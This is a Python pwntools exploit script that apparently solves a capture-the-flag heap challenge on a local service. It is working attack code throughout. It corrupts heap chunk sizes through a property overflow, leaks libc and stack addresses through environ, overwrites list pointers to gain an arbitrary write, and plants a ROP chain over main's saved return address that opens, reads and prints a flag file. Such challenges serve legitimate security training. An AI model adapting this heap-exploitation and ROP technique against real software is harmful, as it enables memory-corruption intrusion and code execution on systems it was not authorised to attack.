#!/usr/bin/env python3

from pwn import *
import re
import os

HOST = os.getenv('HOST', '127.0.0.1')
PORT = int(os.getenv('PORT', 38004))

def new(r, props=None):
	r.sendlineafter(b'> ', b'n')

	if props is not None:
		setprops(r, props)

def setprops(r, props):
	assert len(props) < 0x1000
	r.sendlineafter(b'> ', b's')
	r.sendlineafter(b':\n', props)

def printobj(r, i):
	r.sendlineafter(b'> ', b'p')
	r.sendlineafter(b': ', str(i).encode())
	r.recvuntil(b'{')
	return r.recvuntil(b'}\n')

def getobjsize(r, i):
	r.sendlineafter(b'> ', b'z')
	r.sendlineafter(b': ', str(i).encode())
	return int(r.recvline())

def delobj(r, i):
	r.sendlineafter(b'> ', b'd')
	r.sendlineafter(b': ', str(i).encode())

def get_leak(r, obj_idx, line_no, match_idx):
	data = printobj(r, obj_idx)
	data = data.splitlines()

	if line_no >= len(data):
		return None

	m = re.findall(br'\t"([^"]*)": "([^"]*)"', data[line_no])
	if not m:
		return None

	leak = m[0][match_idx]
	if len(leak) > 8:
		return None

	return u64(leak.ljust(8, b'\0'))

def write_data(r, data):
	assert b'=' not in data and b';' not in data and b'\n' not in data

	zeroes = reversed([i for i in range(len(data)) if data[i] == 0])
	data = data.replace(b'\x00', b'\xCC')

	setprops(r, data + b'=A')

	for i in zeroes:
		setprops(r, data[:i])

def run(libc):
	r = remote(HOST, PORT)

	# Corrupt size of next allocation
	new(r, b'xx=x=AAAAA')

	# Broken size: 0x4141 instead of 0x0
	new(r)

	# Leak addr of libc's _nl_global_locale (somehow in memory of ld.so)
	leak = get_leak(r, 0, 4929, 0)
	if not leak or leak & 0x700000000000 != 0x700000000000:
		r.close()
		return False

	libc.address = leak - 0x21b580
	log.success('Leak: 0x%x', leak)
	log.info('=> libc @ 0x%x', libc.address)
	log.info('=> environ @ 0x%x', libc.sym.environ)

	# Allocate new objects and set properties large enough to exhaust the first
	# mmap and warrant a new mmap when reallocating.
	new(r, b'x=' + b'A' * 0xfef)
	new(r, b'x=' + b'A' * 0xfef)

	# Use up almost all the space of this second mmap
	new(r, b'x=' + b'A' * 0xfb0)
	new(r, b'x=' + b'A' * 0xfc0)

	# Now allocate two small objects one after the other: overflow on the first
	# one to corrupt the size of the second one, then use the second one to
	# easily corrupt the ->next of the very first object (sitting at the start
	# of the next mmap'd page). This could be done in a variety of ways, even
	# with just one object...
	new(r, b'xx=x=AAAAA')
	new(r)

	# Set ->next of last list obj to environ, so that we can query its size to
	# leak the stack (the ptr to the first env var)
	write_data(r, b'A' * 0x10 + p64(0x1337) + p64(libc.sym.environ))

	stack_addr   = getobjsize(r, 8)
	main_retaddr = stack_addr - 0x120
	buf_addr     = main_retaddr - 0x100

	log.success('Stack leak: 0x%x', stack_addr)
	log.info('=> main() ret addr @ 0x%x', main_retaddr)

	# Point ->next of last list obj on the stack slightly before the saved main
	# retaddr, the size should be a huge value so we can edit (setprops) easily
	write_data(r, b'A' * 0x10 + p64(0x1337) + p64(main_retaddr - 0x18))

	# Now we can pop everything from the list, then edit to write to the stack
	for _ in range(8):
		delobj(r, 0)

	rop = ROP(libc, badchars='\n;=')
	pop_rax = rop.find_gadget(['pop rax', 'ret']).address
	pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
	pop_rsi = rop.find_gadget(['pop rsi', 'ret']).address
	pop_rdx = rop.find_gadget(['pop rdx', 'pop rbx', 'ret']).address
	syscall = rop.find_gadget(['syscall', 'ret']).address

	write_data(r, flat(
		# open("flag", O_RDONLY, 0)
		u64(b'\0flag\0\0\0'),
		pop_rdi, main_retaddr - 0x8 + 0x1,
		pop_rsi, 0x0,
		pop_rdx, 0x0, 0xCCCCCCCCCCCCCCCC,
		pop_rax, 0x2,
		syscall,
		# read(3, buf_addr, 0x100)
		pop_rdi, 0x3,
		pop_rsi, buf_addr,
		pop_rdx, 0x100, 0xCCCCCCCCCCCCCCCC,
		pop_rax, 0x0,
		syscall,
		# write(1, buf_addr, 0x100)
		pop_rdi, 0x1,
		pop_rsi, buf_addr,
		pop_rdx, 0x100, 0xCCCCCCCCCCCCCCCC,
		pop_rax, 0x1,
		syscall,
		# exit(0)
		pop_rdi, 0x0,
		pop_rax, 0x3c,
		syscall
	))

	# Run chain and get flag, GG
	r.sendlineafter(b'> ', b'e')
	data = r.clean(5)
	r.close()

	match = re.search(rb'\w+\{[^}]+\}', data)
	if not match:
		return False

	print(match.group(0).decode())
	return True

if __name__ == '__main__':
	context(arch='amd64')
	libc = ELF('libs/libc.so.6', checksec=False)

	while 1:
		try:
			if run(libc):
				break
		except AssertionError:
			continue
